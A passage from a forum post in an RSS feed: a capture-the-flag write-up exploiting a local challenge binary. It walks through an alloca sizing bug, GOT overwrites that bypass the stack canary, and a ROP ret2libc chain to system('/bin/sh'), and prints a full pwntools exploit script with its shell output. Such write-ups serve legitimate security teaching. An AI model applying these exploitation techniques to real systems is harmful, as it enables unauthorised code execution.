+<h3><a name="p-54170-inspecting-the-function-that-calculates-the-sum-6" class="anchor" href="https://d.clarkee.co.uk#p-54170-inspecting-the-function-that-calculates-the-sum-6"></a>Inspecting the function that calculates the sum.</h3>
+<pre data-code-wrap="C"><code class="lang-C">void calc_sum(void) {
+  long i;
+  long *array;
+  long result;
+  
+  array = (long*)alloca(n * 4);       
+
+  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
+    printf("num[%ld] = ", i + 1);
+    array[i] = read_long();
+  }
+
+  for(result = 0, i = 0; i &lt; n; i++) {
+    result += array[i];
+  }
+
+  printf("SUM = %ld\n", result);
+}
+
+</code></pre>
+<p>If you are unfamiliar with <code>alloca</code>, <code>man 3 alloca</code> to check the manual page for it.</p>
+<blockquote>
+<p>The alloca()  function allocates size bytes of space in the stack frame of the caller.  This temporary space  is  automatically  freed  when the function that called alloca() returns to its caller</p>
+</blockquote>
+<p><code>alloca</code> allocates memory <strong>in the stack frame of the caller</strong>, in this case, <code>calc_sum</code>.</p>
+<p><strong>This is an interesting choice.</strong> Usually, people use <code>malloc</code> to allocate space at runtime. But in this case, since <code>n</code> is bound to 1-22, it is not too bad. Too much stack space is <strong>not</strong> used.</p>
+<p>Then, N integers that are read from <code>read_long()</code> are placed in the memory we allocated.<br>
+The sum is calculated and the result is printed. Not too much going here as well.</p>
+<p><strong>If you want to figure out the vulnerability on your own, stop here.</strong></p>
+<h2><a name="p-54170-introducing-magic-numbers-7" class="anchor" href="https://d.clarkee.co.uk#p-54170-introducing-magic-numbers-7"></a>Introducing magic numbers</h2>
+<blockquote>
+<p>The term <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)" rel="noopener nofollow ugc">magic number</a> or magic constant refers to the anti-pattern of using numbers directly in source code</p>
+</blockquote>
+<p>The use of magic numbers is often frowned upon. They make your code difficult to understand and often introduce subtle bugs.</p>
+<p>Take a look at the following piece of code from Wikipedia.</p>
+<pre data-code-wrap="C"><code class="lang-C">   for i from 1 to 52
+       j := i + randomInt(53 - i) - 1
+       a.swapEntries(i, j)
+</code></pre>
+<p>52 and 53 (and most other numbers which has no meaning in local context) is a magic number.<br>
+In this above case, the only problem this poses is a slight annoyance over the mysterious 52. Cases like the following, however, may create portability issues.</p>
+<pre data-code-wrap="c"><code class="lang-c">const int array_size = 20;
+int *ptr = (int*) malloc(array_size * 4);
+</code></pre>
+<p>Here, 4 is the magic number. The peice of code above executes properly in systems where the <code>sizeof (int) == 4</code>. But if it is 2, it breaks miserably when we attempt to use <code>ptr</code>.</p>
+<p>If we were to write this properly, we would use something like.</p>
+<pre data-code-wrap="c"><code class="lang-c">const int array_size = 20;
+int *ptr = (int*) malloc(array_size * sizeof (int));
+</code></pre>
+<p>Okay, now you are equipped with the knowledge of magic numbers! Let us approach this problem again.</p>
+<h2><a name="p-54170-finding-an-arbitrary-write-8" class="anchor" href="https://d.clarkee.co.uk#p-54170-finding-an-arbitrary-write-8"></a>Finding an arbitrary write.</h2>
+<p>Take a look at:</p>
+<pre data-code-wrap="c"><code class="lang-c">  array = (long*) alloca(n * 4);       
+</code></pre>
+<p>This is the exact portability issue that we discussed earlier.<br>
+Only <code>sizeof(char)</code> is fixed as 1 by the C standard. Everything else usually only has minimum size requirements. The compiler can choose whatever size it sees is the best.<br>
+Usually, in x86_64 compilers make the <code>sizeof(long) == 8</code>. This is convenient because a <code>long</code> will fit in a register.</p>
+<p><strong>In this case, sizeof(long) == 8</strong></p>
+<p>So we have allocated space like <code>alloca(n * 4);</code> yet the <code>sizeof(long) == 8</code> (In x86_64, this is usually the case).</p>
+<p>Therefore, we are only allocating enough memory for <code>n/2</code> longs. Yet, we access all <code>n</code> of them. We are accessing memory not allocated for us! Also, <strong>we can write to that memory.</strong></p>
+<p>Even more convenient is the fact that <code>alloca</code>  was used. The extra memory we are addressing is on the stack.</p>
+<p>The stack frame will usually look like this for the <code>calc_sum</code> function.</p>
+<pre><code class="lang-auto">-----------------------------------------
+|      Arguments to the function        |
+-----------------------------------------
+|           Return Address              |
+-----------------------------------------
+|      Local variables of calc_sum      |
+-----------------------------------------
+|          Alloca(n*4) buffer           |
+-----------------------------------------
+</code></pre>
+<p>We can potentially overwrite the local variable <code>array</code> to achieve arbitrary write!</p>
+<h2><a name="p-54170-exploiting-the-arbitrary-write-once-9" class="anchor" href="https://d.clarkee.co.uk#p-54170-exploiting-the-arbitrary-write-once-9"></a>Exploiting the arbitrary write once.</h2>
+<p>Let’s fire up gdb:</p>
+<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ r
+n = 21
+num[1] = 
+num[2] = 
+num[3] = 
+num[4] = 
+... 
+num[15] = 
+num[2] = 
+</code></pre>
+<p>We use n = 21. <em>Note that n is restricted to 1-22 (re-read the code if you are confused).</em></p>
+<p>I just pass it empty strings so that <code>num[1]</code> through <code>num[15]</code> will be equal to 0.</p>
+<p>We notice that after <code>num[15]</code>, we loop back to <code>num[2]</code>.<br>
+We have overwritten the local variable <code>i</code>!</p>
+<p>Since we have overwritten the local variable <code>i</code> with 0, we again start the loop from 2. (i++ is done at the end and printf() uses i+1).</p>
+<p>We are looping indefinitely.</p>
+<p>But, looping indefinitely is not useful to us.<br>
+To write to memory beyond this, we override the <code>i</code> with 14 (exactly the current index).<br>
+So that in the next iteration we get to <code>num[16]</code>.</p>
+<pre data-code-wrap="C"><code class="lang-C">gdb-peda$ r
+n = 21
+num[1] = 
+...
+num[15] = 14
+num[16] = 
+</code></pre>
+<p>We can now write past the limit and override <code>*array</code> in the next iteration! Then write to <code>*(array+n)</code> in the iteration after that!. That means since we control <code>array</code> we can write to anywhere we wish.</p>
+<p>Let’s try to override the <code>printf</code>’s <a href="https://en.wikipedia.org/wiki/Global_Offset_Table" rel="noopener nofollow ugc">GOT</a> entry to point to the <code>puts()</code> call in the code to test things.</p>
+<p>First, we get the GOT entry of <code>printf</code>.</p>
+<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ x/i printf
+   0x400690 &lt;printf@plt&gt;:
+    jmp    QWORD PTR [rip+0x20099a]        #0x601030
+
+</code></pre>
+<p><code>0x601030</code> is the GOT offset of printf</p>
+<p>We then get the location where the <code>puts</code> call is made.</p>
+<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ disass read_long
+Dump of assembler code for function read_long:
+   0x00000000004007c7 &lt;+0&gt;:     push   rbp
+   0x00000000004007c8 &lt;+1&gt;:     mov    rbp,rsp
+   ...
+   0x0000000000400813 &lt;+76&gt;:    lea    rdi,[rip+0x28a]        # 0x400aa4
+   0x000000000040081a &lt;+83&gt;:    call   0x400660 &lt;puts@plt&gt;
+   ...
+   End of assembler dump.
+</code></pre>
+<p><code>0x000000000040081a</code> is the place we want the GOT offset to point to.</p>
+<p>So we override the value at <code>0x601030</code> with <code>0x000000000040081a</code></p>
+<pre data-code-wrap="C"><code class="lang-C">gdb-peda$ r
+n = 21
+num[1] =
+...
+num[15] = 14
+num[16] = 
+num[17] = 6295464
+num[18] = 4196378
+num[%ld] = 
+[Inferior 1 (process 16567) exited with code 01]
+
+</code></pre>
+<p>As you can see, <code>num[%ld] = </code> was printed without formatting. Awesome.<br>
+<code>printf@plt</code> jumped to <code>call puts@plt</code> (and the <code>call exit@plt</code> next).</p>
+<p><strong>But wait a minute…</strong><br>
+The careful reader might have noticed,<br>
+<code>0x601030 = 6295600</code><br>
+But we have used, <code>6295464</code> in gdb which is <code>0x601030 - 17*8</code></p>
+<p><strong>Why so?</strong><br>
+This is because in the next iteration we override the value at <code>array[17]</code> not <code>array[0]</code> therefore we correct the address by subtracting with <code>17 * sizeof(long)</code></p>
+<p>With this, we have achieved arbitrary write!!</p>
+<p>As of right now, we can only overwrite to memory once. But, it is still a step in the right direction.</p>
+<h2><a name="p-54170-overwriting-to-memory-more-than-once-10" class="anchor" href="https://d.clarkee.co.uk#p-54170-overwriting-to-memory-more-than-once-10"></a>Overwriting to memory more than once.</h2>
+<p>In order to overwrite to arbitrary memory more than once, we need to find a way to jump to the top of the <code>calc_sum()</code> function whenever we want.<br>
+We will do this with a GOT entry overwrite.</p>
+<p>Take a look at the following code from <code>read_long</code>.</p>
+<pre data-code-wrap="c"><code class="lang-c">  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
+  if (readByte == 0) {
+    puts("[ERROR] read failed");        // no bytes read = exit()
+    exit(1);
+  }
+</code></pre>
+<p>Bring up the man page of <code>read</code>: <code>man 2 read</code>.</p>
+<blockquote>
+<p>On success, the number of bytes read is  returned  (zero  indicates the end  of file)</p>
+</blockquote>
+<p>The if block only executes when we provide EOF to the input stream. If we overwrite either the <code>puts</code> or the <code>exit</code> GOT entry to point to the top of the <code>calc_sum</code> function, we can send an EOF to jump to the top of the function. This will allow us to overwrite regions of memory multiple times.</p>
+<p>The relevant info:</p>
+<pre data-code-wrap="c"><code class="lang-c">calc_sum = 0x40088e = 4196494
+puts@got = 0x601018 
+</code></pre>
+<p>Again, we need to overwrite the correct address so we correct the address <code>0x601018</code> so that <code>array[17]</code> will point to <code>0x601018</code></p>
+<pre data-code-wrap="C"><code class="lang-C">0x601018 - 17*8 = 6295440
+</code></pre>
+<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ r
+n = 21
+num[1] = 
+...
+num[15] = 14
+num[16] = 
+num[17] = 6295440
+num[18] = 4196494
+num[19] = num[1] = 
+</code></pre>
+<p>I used <code>CTRL + D</code> to send a EOF to the terminal. We can see the output <code>num[1]</code>. We jumped to the start of the <code>calc_sum</code> again!<br>
+We can use this to overwrite to memory any number of times.</p>
+<h2><a name="p-54170-rop-and-ret2libc-11" class="anchor" href="https://d.clarkee.co.uk#p-54170-rop-and-ret2libc-11"></a>ROP and ret2libc</h2>
+<p>In this challenge, we have DEP and stack cookies that protect executing stack space and checking if the stack frame has been overwritten.</p>
+<p>Most of the time, we <strong>do not have</strong> a space in a process that is both <strong>writable and executable</strong>.<br>
+For instance let’s check for our current executable.</p>
+<pre data-code-wrap="c"><code class="lang-c">[gnik@tinybot ~/]$ ./thebinary &amp;
+n =                                 
+[gnik@tinybot ~/]$ ps aux | grep thebinary
+gnik     16890  0.0  0.0  10696  1040 pts/1    t    16:01   0:00 /home/gnik/thebinary
+[gnik@tinybot ~/]$ pmap 16890
+16890:   /home/gnik/thebinary
+0000000000400000      4K r-x-- thebinary
+0000000000600000      4K r---- thebinary
+0000000000601000      4K rw--- thebinary
+00007ffff73ba000    104K r-x-- libpthread-2.27.so
+00007ffff73d4000   2044K ----- libpthread-2.27.so
+00007ffff75d3000      4K r---- libpthread-2.27.so
+00007ffff75d4000      4K rw--- libpthread-2.27.so
+00007ffff75d5000     16K rw---   [ anon ]
+00007ffff75d9000     12K r-x-- libdl-2.27.so
+00007ffff75dc000   2044K ----- libdl-2.27.so
+00007ffff77db000      4K r---- libdl-2.27.so
+00007ffff77dc000      4K rw--- libdl-2.27.so
+00007ffff77dd000   1948K r-x-- libc-2.27.so
+00007ffff79c4000   2048K ----- libc-2.27.so
+00007ffff7bc4000     16K r---- libc-2.27.so
+00007ffff7bc8000      8K rw--- libc-2.27.so
+00007ffff7bca000     16K rw---   [ anon ]
+00007ffff7bce000     24K r-x-- libgtk3-nocsd.so.0
+00007ffff7bd4000   2044K ----- libgtk3-nocsd.so.0
+00007ffff7dd3000      4K r---- libgtk3-nocsd.so.0
+00007ffff7dd4000      4K rw--- libgtk3-nocsd.so.0
+00007ffff7dd5000    156K r-x-- ld-2.27.so
+00007ffff7fbe000     16K rw---   [ anon ]
+00007ffff7ff7000     12K r----   [ anon ]
+00007ffff7ffa000      8K r-x--   [ anon ]
+00007ffff7ffc000      4K r---- ld-2.27.so
+00007ffff7ffd000      4K rw--- ld-2.27.so
+00007ffff7ffe000      4K rw---   [ anon ]
+00007ffffffde000    132K rw---   [ stack ]
+ffffffffff600000      4K r-x--   [ anon ]
+ total            10700K
+
+</code></pre>
+<p>As you can see, <strong>none of them have both the write and execute bit set</strong>.</p>
+<p>This is a pretty common security measure, so we cannot write shellcode to a certain memory region and jump to it.</p>
+<p>This is where <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" rel="noopener nofollow ugc">ret2libc</a> and <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" rel="noopener nofollow ugc">ROP</a> come into play.</p>
+<p>With <strong>ret2libc</strong> we are jumping to certain points in the libc library that is loaded at runtime. For instance, we can jump to potentially dangerous places like <code>system()</code> which is present in <code>libc</code>.</p>
+<p>With <strong>ROP</strong> we jump to small code segments in the address space of the process that does a certain task before jumping to a different segment. Chaining a bunch of these ROP <em>gadgets</em> can hence be very powerful.</p>
+<p>Our plan to achieve RCE is as follows:</p>
+<ul>
+<li>Find the address of system() in libc</li>
+<li>Find the address of the string '/bin/sh/` lin libc</li>
+<li>Find a ROP gadget that can place the address of the <code>/bin/sh</code> string in the rdi register.</li>
+<li>Jump to system()</li>
+</ul>
+<p>Finding the address of system() and the string ‘/bin/sh’ is pretty straight forward.</p>
+<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ start
+....
+Temporary breakpoint 1, 0x00000000004009bd in main ()
+gdb-peda$ p system
+$1 = {int (const char *)} 0x7ffff782c440 &lt;__libc_system&gt;
+</code></pre>
+<pre data-code-wrap="c"><code class="lang-c">gdb-peda$ info proc map
+process 17653
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+      .......
+      .......
+      0x7ffff77dd000     0x7ffff79c4000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff79c4000     0x7ffff7bc4000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bc4000     0x7ffff7bc8000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bc8000     0x7ffff7bca000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bca000     0x7ffff7bce000     0x4000        0x0 
+      0x7ffff7bce000     0x7ffff7bd4000     0x6000        0x0 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
+      .......
+      .......
+gdb-peda$ find  '/bin/sh' 0x7ffff77dd000 0x7ffff79c4000
+Searching for '/bin/sh' in range: 0x7ffff77dd000 - 0x7ffff79c4000
+Found 1 results, display max 1 items:
+libc : 0x7ffff7990e9a --&gt; 0x68732f6e69622f ('/bin/sh')
+</code></pre>
+<p><strong>The system() function is present in <code>0x7ffff782c440</code></strong><br>
+<strong>Address of the string ‘/bin/sh’ is <code>0x7ffff7990e9a</code></strong></p>
+<p><strong>These addresses are most likely different for your machine</strong></p>
+<h2><a name="p-54170-learning-to-write-exploit-scripts-12" class="anchor" href="https://d.clarkee.co.uk#p-54170-learning-to-write-exploit-scripts-12"></a>Learning to write exploit scripts.</h2>
+<p><strong>Sufficient knowledge of python is assumed, although not necessary to understand this section.</strong></p>
+<p>There are a lot of ways to write your exploit scripts.<br>
+I will keep things simple and write one in using <code>python3</code> and <a href="http://docs.pwntools.com/en/stable/" rel="noopener nofollow ugc">pwntools</a></p>
+<p>We will do everything we have done so far with gdb in python.</p>
+<p>Create a new python script.</p>
+<pre data-code-wrap="py"><code class="lang-py">import pwn
+import tty
+</code></pre>
+<p>You can install <code>pwntools</code> with pip and <code>import pwn</code> to work with it. We will also be using some constants from <code>tty</code></p>
+<pre data-code-wrap="py"><code class="lang-py">p = pwn.process('./thebinary', stdin=pwn.PTY, raw = False)
+
+# g = pwn.gdb.attach(p, """
+# """)
+</code></pre>
+<p>This is how you start a local process in <code>pwntools</code>. <strong>Note the <code>raw = False</code> and <code>stdin=pwn.PTY</code>!</strong><br>
+These options are essential to our current project since we write EOF to stream and not close our stream. (Yes this sounds weird, but this is necessary.)<br>
+You can experiment with attaching the debugger by uncommenting some lines here.</p>
+<pre data-code-wrap="py"><code class="lang-py">def setup():
+    p.sendline('21')
+
+def write_junk(count):
+    for x in range(count):
+        p.sendline('')
+
+def overwrite_memory(addr, data):
+    p.sendline('14')
+    p.sendline('')
+    p.sendline(str(addr))
+    p.sendline(str(data))
+
+
+def send_eof():
+    """
+    Note Send EOF sends 2 bytes!!!
+    """
+    p.sendline(chr(tty.CEOF))
+</code></pre>
+<p>These are some of the functions that will be useful to us. The functions are self-explanatory. If you have never written an exploit before with pwntools, feel free to experiment here. <code>p.sendline()</code> is used to send a line to the process.</p>
+<pre data-code-wrap="py"><code class="lang-py">
+setup()
+"""
+Overwrite the GOT of puts for the ability to write memory many times
+"""
+write_junk(14)
+# 0x40088e = calc_sum
+# 0x601018 = GOT of puts
+# Overwrite GOT of puts with calc_sum
+overwrite_memory(0x601018 - 17*8, 0x40088e)
+send_eof()
+
+p.interactive()
+</code></pre>
+<p>Okay, so now that all that is over, we will first overwrite the GOT entry of <code>puts</code> with <code>calc_sum</code> so that we can use EOF to jump to it again. Our nifty little <code>overwrite_memory()</code> function makes this easier.</p>
+<p>The <code>p.interactive()</code> at the end is used to make the process interactive. After this, you can use the terminal for IO.</p>
+<p>I recommend you experiment with the script.</p>
+<h2><a name="p-54170-things-that-are-necessary-for-the-exploit-to-work-13" class="anchor" href="https://d.clarkee.co.uk#p-54170-things-that-are-necessary-for-the-exploit-to-work-13"></a>Things that are necessary for the exploit to work.</h2>
+<p>These are some things that will be useful to us as we move on to ROP.</p>
+<ol>
+<li>Overwrite the GOT entry of <code>__stack_chk_fail</code> to point to the <code>leaveq; ret</code> instruction in <code>calc_sum</code> to bypass stack smashing check.</li>
+<li>Overwrite the value of n to 30 so that we can overwrite more memory at once. (This is used in the ROP step later)</li>
+</ol>
+<p>I will not show this in gdb since I have already shown you how to overwrite arbitrary memory, and the writeup will be pretty repetitive if I include this.</p>
+<p>If you are confused, please refer to the code snippet below from the exploit script.</p>
+<pre data-code-wrap="py"><code class="lang-py">"""
+Overwrite the GOT of __stack_chk_fail for beating the stack cookie
+"""
+write_junk(13)
+# 0x601020 = GOT of __stack_chk_fail
+# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
+overwrite_memory(0x601020 - 17*8, 0x4009b3)
+send_eof()
+
+"""
+Overwrite global n to overwrite more data on the stack
+"""
+write_junk(13)
+# n = 0x6010b0
+# Overwrite n with 30
+overwrite_memory(0x6010b0 - 17*8, 30)
+send_eof()
+
+</code></pre>
+<h2><a name="p-54170-finding-the-necessary-rop-gadgets-14" class="anchor" href="https://d.clarkee.co.uk#p-54170-finding-the-necessary-rop-gadgets-14"></a>Finding the necessary ROP gadgets</h2>
+<p>I use <a href="https://github.com/JonathanSalwan/ROPgadget" rel="noopener nofollow ugc">ROPgadget</a> tool to find the necessary ROP gadgets from the executable. You can use the plethora of alternatives available to you. (gdb-peda also has one!)</p>
+<pre><code class="lang-auto">[gnik@tinybot ~/]$ 
+ROPgadget --binary thebinary 
+...
+0x0000000000400a83 : pop rdi ; ret
+...
+0x0000000000400646 : ret
+...
+
+Unique gadgets found: 112
+
+</code></pre>
+<p>We will need two ROP gadgets, <code>pop rdi; ret</code> and <code>ret</code>.<br>
+<code>pop rdi; ret</code> to load the address of the string into the <code>rdi</code> register and then <code>ret</code> gadget to align the stack address for the <code>movqs</code> instruction. (The reason this is necessary is left as an exercise.)</p>
+<h2><a name="p-54170-writing-the-final-exploit-script-15" class="anchor" href="https://d.clarkee.co.uk#p-54170-writing-the-final-exploit-script-15"></a>Writing the final exploit script.</h2>
+<p>We finally have all the tools that we need to write a final exploit script.</p>
+<p>The final exploit script looks something like.</p>
+<pre data-code-wrap="py"><code class="lang-py">import pwn
+import tty
+
+p = pwn.process('./thebinary', stdin=pwn.PTY, raw = False)
+
+#g = pwn.gdb.attach(p, """
+#b *0x00000000004009b8
+#c
+#""")
+
+def setup():
+    p.sendline('21')
+
+def write_junk(count):
+    for x in range(count):
+        p.sendline('')
+
+def overwrite_memory(addr, data):
+    p.sendline('14')
+    p.sendline('')
+    p.sendline(str(addr))
+    p.sendline(str(data))
+
+
+def send_eof():
+    """
+    Note Send EOF sends 2 bytes!!!
+    """
+    p.sendline(chr(tty.CEOF))
+
+
+setup()
+"""
+Overwrite the GOT of puts for the ability to write memory many times
+"""
+write_junk(14)
+# 0x40088e = calc_sum
+# 0x601018 = GOT of puts
+# Overwrite GOT of puts with calc_sum
+overwrite_memory(0x601018 - 17*8, 0x40088e)
+send_eof()
+
+
+"""
+Overwrite the GOT of __stack_chk_fail for beating the stack cookie
+"""
+write_junk(13)
+# 0x601020 = GOT of __stack_chk_fail
+# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
+overwrite_memory(0x601020 - 17*8, 0x4009b3)
+send_eof()
+
+"""
+Overwrite global n to overwrite more data on the stack
+"""
+write_junk(13)
+# n = 0x6010b0
+# Overwrite n with 30
+overwrite_memory(0x6010b0 - 17*8, 30)
+send_eof()
+
+
+"""
+Overwrite the stack with ROP chain for ret2libc
+"""
+write_junk(17)
+p.sendline('24')
+# 0x400a83 : pop rdi ; ret
+p.sendline(str(0x400a83))
+
+# /bin/sh = 0x7ffff7990e9a
+p.sendline(str(0x7ffff7990e9a))
+
+# 0x00400646 = ret
+# This is needed because the movaps instruction must be properly aligned.
+p.sendline(str(0x00400646))
+
+# system() = 0x7ffff782c440
+p.sendline(str(0x7ffff782c440))
+p.sendline("")
+p.interactive()
+</code></pre>
+<p>Most of the script has already been discussed.<br>
+Let us focus on the rest that remains.</p>
+<pre data-code-wrap="py"><code class="lang-py">"""
+Overwrite the stack with ROP chain for ret2libc
+"""
+write_junk(17)
+p.sendline('24')
+# 0x400a83 : pop rdi ; ret
+p.sendline(str(0x400a83))
+
+# /bin/sh = 0x7ffff7990e9a
+p.sendline(str(0x7ffff7990e9a))
+
+# 0x00400646 = ret
+# This is needed because the movaps instruction must be properly aligned.
+p.sendline(str(0x00400646))
+
+# system() = 0x7ffff782c440
+p.sendline(str(0x7ffff782c440))
+p.sendline("")
+p.interactive()
+</code></pre>
+<p><strong>The first question that needs to be answered: Why have some constants changed?</strong><br>
+<code>write_junk(13)</code> was used while overwriting memory the last time why is <code>write_junk(17)</code> used this time?</p>
+<p>This is due to the fact that <code>n = 21</code> in all previous cases but we have just recently overwritten <code>n = 30</code> so that we can overwrite more of the stack. Hence, the offsets at which the local variable <code>i</code> is overwritten has changed.<br>
+You can experiment with the same method used above to figure out the offset when n = 30.</p>
+<p>Okay, now let’s discuss the <strong>ROP</strong> part of the exploit.</p>
+<pre data-code-wrap="py"><code class="lang-py"># 0x400a83 : pop rdi ; ret
+p.sendline(str(0x400a83))
+
+# /bin/sh = 0x7ffff7990e9a
+p.sendline(str(0x7ffff7990e9a))
+
+# 0x00400646 = ret
+# This is needed because the movaps instruction must be properly aligned.
+p.sendline(str(0x00400646))
+
+# system() = 0x7ffff782c440
+p.sendline(str(0x7ffff782c440))
+</code></pre>
+<p>To set up our exploit, we overwrite the stack to the point where we can overwrite the return address.<br>
+We then place the address of the <code>pop rdi; ret</code> ROP gadget followed by the address to the <code>/bin/sh</code> string.</p>
+<p>When the function returns, it jumps to execute <code>pop rdi; ret</code>. Since the address of the string is on the stack, <code>pop rdi</code> places the address of the string in the rdi register. And then we <code>ret</code> to another address…</p>
+<p>… The address we jump to is the address of <code>ret</code> instruction. <code>ret</code> gadget is used to align our stack. (This is necessary since movaps instruction (used by system()) needs the stack to be 16 bit aligned.). <code>ret</code> is a NOP in ROP (a gadget that does nothing).</p>
+<p><strong>Note that this might not be necessary if your stack is already 16 bit aligned.</strong></p>
+<p>We then place the address of the system call on the stack. The <code>ret</code> gadget then pops this address off the stack and then jumps to system() in libc.</p>
+<p>We have successfully placed the address of the string ‘/bin/sh’ in <code>rdi</code> and then jumped to system()!</p>
+<p><strong>Wait… There is more…</strong><br>
+Remember we overwrote the GOT entry of __stack_chk__fail so that the stack cookie check would unconditionally return to <code>leaveq; ret</code><br>
+Since we have overwritten the return address, we have surely overwritten the stack cookie.<br>
+Therefore, if we hadn’t overwritten the GOT entry of <code>__stack_chk_fail</code> our exploit would have failed.</p>
+<p><strong>We can also overwrite a GOT entry and jump using that to avoid this</strong>.</p>
+<h2><a name="p-54170-putting-it-all-together-16" class="anchor" href="https://d.clarkee.co.uk#p-54170-putting-it-all-together-16"></a>Putting it all together</h2>
+<pre data-code-wrap="fish"><code class="lang-fish">[gnik@tinybot ~/]$ python3 exploit.py
+[+] Starting local process './thebinary': pid 18969
+[*] Switching to interactive mode
+n = 21
+....
+....
+SUM = -3105548685935727921
+$ $ whoami
+whoami
+gnik
+</code></pre>
+<p><strong>This is my first post here in 0x00sec, so any feedback would be helpful. In an upcoming writeup, we will exploit the same executable but with ASLR enabled. : )</strong></p>
+          <p><a href="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751/1</link>
+        <pubDate>Wed, 11 Mar 2020 04:42:11 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-19751-1</guid>
+        <source url="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751.rss">Punishing code with magic numbers with ROP and ret2libc on an x86_64</source>
+      </item>
+  </channel>
+</rss>
